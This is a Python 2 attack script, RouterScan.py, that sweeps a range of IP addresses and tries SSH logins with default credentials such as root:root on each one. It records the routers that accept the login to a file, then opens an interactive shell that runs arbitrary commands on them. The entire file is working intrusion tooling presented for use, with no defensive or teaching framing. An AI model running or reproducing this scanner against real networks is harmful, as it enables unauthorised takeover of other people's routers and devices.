"""
RouterScan.py - Scans for routers running ssh with default user/password
               Written by Sotd - twitter.com/#!/Sotd_
"""
#Try root:admin , root:root and such
 
import sys
import threading
import Queue
 
try:
    import paramiko
except ImportError:
    print 'Paramiko is required.'
    print 'http://www.lag.net/paramiko/'
    sys.exit(1)
 
found = []


class Router(threading.Thread):
    """Handles connection attempts"""
 
    def __init__(self, queue):
        threading.Thread.__init__(self)
        self.user = sys.argv[3]
        self.password = sys.argv[4]    
        self.queue = queue
         
    def run(self):
        """Tries to connect to given Ip on port 22"""
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        while True:
            try:
                ip_add = self.queue.get(False)
 
            except Queue.Empty:
                break
            try:
                ssh.connect(ip_add, username = self.user, password = self.password, timeout = 10)
                ssh.close()
 
            except:
                print 'Not Working: %s:22 - %s:%s\n' % (ip_add, self.user, self.password)

            else:
                global found
                print "Working: %s:22 - %s:%s\n" % (ip_add, self.user, self.password)
                write = open('Routers.txt', "a+")
                write.write('%s:22 %s:%s\n' % (ip_add, self.user, self.password))
                write.close()  
                found.append(ip_add)
            self.queue.task_done()

def command():
    """Allows user to run commands on a chosen router"""
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    num = 0
    if found:
        for addr in found:
            print "[%s] %s " % (num, addr)
            num += 1
        again = 'y'
        while again == 'y':
            choose = raw_input('Enter number to attempt command execution(q to quit):')
            if choose != 'q':
                chosen = found[int(choose)]
                print 'Connecting to %s' % (chosen)
                try:
                    ssh.connect(chosen, username = sys.argv[3], password = sys.argv[4], timeout = 10)
                except:
                    print 'Problem connecting'
                else:
                    commanding = 'y'
                    print 'Enter q to quit'
                    while commanding == 'y':
                        execute = raw_input(sys.argv[3] + '@' + chosen + ':~$ ') #enter command
                        if execute == 'q':
                            commanding = 'n'
                        else:
                            try:
                                stdin, stdout, stderr = ssh.exec_command(execute)
                                print stdout.read()
                            except:
                                print 'Whoops'

                again = raw_input('Go again(y or n)')
            else:
                break
           
def iprange():
    """Creates list of Ip's from Start_Ip to End_Ip"""
    queue = Queue.Queue()
    start_ip = sys.argv[1]
    end_ip = sys.argv[2]
    ip_range = []
    start = list(map(int, start_ip.split(".")))
    end = list(map(int, end_ip.split(".")))
    tmp = start
   
    ip_range.append(start_ip)
    while tmp != end:
        start[3] += 1
        for i in (3, 2, 1):
            if tmp[i] == 256:
                tmp[i] = 0
                tmp[i-1] += 1
        ip_range.append(".".join(map(str, tmp)))
   
    for add in ip_range:
        queue.put(add)
 
    for i in range(10):
        thread = Router(queue)
        thread.setDaemon(True)
        thread.start()
    queue.join()
    command()
     
if __name__ == '__main__':
    if len(sys.argv) != 5:
        print 'Example: ./router.py 127.0.0.1 127.0.0.5 root root'
        sys.exit(1)
    else:
        iprange()
